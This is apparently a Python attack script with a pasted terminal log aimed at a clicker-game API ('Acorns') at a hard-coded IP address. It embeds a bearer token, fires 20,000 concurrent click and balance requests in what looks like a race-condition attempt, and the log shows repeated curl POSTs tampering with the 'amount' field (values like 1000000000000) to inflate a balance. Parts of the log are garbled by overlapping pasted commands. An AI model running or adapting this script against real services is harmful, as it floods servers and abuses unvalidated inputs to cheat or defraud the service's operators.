import asyncio
import aiohttp

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzQ1Njc4OTAiLCJpYXQiOjE3NDM4Njk3OTQsImV4cCI6MTc0Mzg3MzM5NH0.hkMY8BMtUw5VS1WFLiDWBkhRFCY9YlFgwnnvD2YbjBg"

async def click_acorn(session):
    url = "http://52.188.82.43:8090/api/click"
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/json"
    }
    data = '{"amount":10}'
    async with session.post(url, headers=headers, data=data) as response:
        return await response.text()

async def check_balance(session):
    url = "http://52.188.82.43:8090/api/balance"
    headers = {
        "Authorization": f"Bearer {TOKEN}"
    }
    async with session.get(url, headers=headers) as response:
        balance = await response.json()
        print(f"Current Balance: {balance['balance']} Acorns")

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(10000):  
            tasks.append(click_acorn(session))
            tasks.append(check_balance(session))

        await asyncio.gather(*tasks)

asyncio.run(main())



"""
 curl -X POST http://52.188.82.43:8090/api/login   -H "Content-Type: application/json"   -d '{"username":"1234567890", "password":"1234567890"}'
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzQ1Njc4OTAiLCJpYXQiOjE3NDM4Njk3OTQsImV4cCI6MTc0Mzg3MzM5NH0.hkMY8BMtUw5VS1WFLiDWBkhRFCY9YlFgwnnvD2YbjBg"}abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~export TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzQ1Njc4OTAiLCJpYXQiOjE3NDM4Njk3OTQsImV4cCI6MTc0Mzg3MzM5NH0.hkMY8BMtUw5VS1WFLiDWBkhRFCY9YlFgwnnvD2YbjBg"wnnvD2YbjBg"
abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ curl -s http://52.188.82.43:8090/api/balance \
  -H "Authorization: Bearer $TOKEN"
{"balance":"0"}abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605Vcurl -s -X POST http://52.188.82.43:8090/api/click \090/api/click \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount":1000000000000}' > /dev/null
abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ curl -s http://52.188.82.43:8090/api/balance   -H "Authorization: Bearer $TOKEN"
{"balance":"0"}abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ curl -s http://52.188.82.43:8090/api/balance   -H "Authorization: Bearer -X POST http://52.188.82.43:8090/api/click   -H "Authorization: Bearer $TOKEN"   -H "Content-Type: application/json"   -d '{"amount":1000000000000}' > /dev/null
abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ curl -s -X POST http://52.188.82.43:8090/api/click   -H "Authorization: Bearer $TOKEN"   -H "Content-Type: application/json"   -d '{"amount":100}' > /dev/null
abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ curl -s -X POST http://52.188.82.43:8090/api/click   -H "Authorization: Bearer $TOKEN"   -H "Content-Type: application/json"   -d '{"amount":1000000000000}' > /dev/null
abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ curl -s http://52.188.82.43:8090/api/balance   -H "Authorization: Bearer $TOKEN"
{"balance":"0"}abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ curl -s http://52.188.82.43:8090/api/balance   -H "Authorization: Bearer $TOKEN"
{"balance":"0"}abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605Vcurl -s -X POST http://52.188.82.43:8090/api/click \090/api/click \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount":10}' > /dev/null
abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ curl -s -X POST http://52.188.82.43:8090/api/click   -H "Authorization: Bearer $TOKEN"   -H "Content-Type: application/json"   -d '{"amount":1000000000000}' > /dev/null
abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ curl -s -X POST http://52.188.82.43:8090/api/click   -H "Authorization: Bearer $TOKEN"   -H "Content-Type: application/json"   -d '{"amount":10}' > /dev/null
abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ curl -s http://52.188.82.43:8090/api/balance   -H "Authorization: Bearer $TOKEN"
{"balance":"20"}abdullaxows@abdullaxows-Vivobook-ASUSLaptop-X1605VA-X1605VA:~/Downloads$ 


"""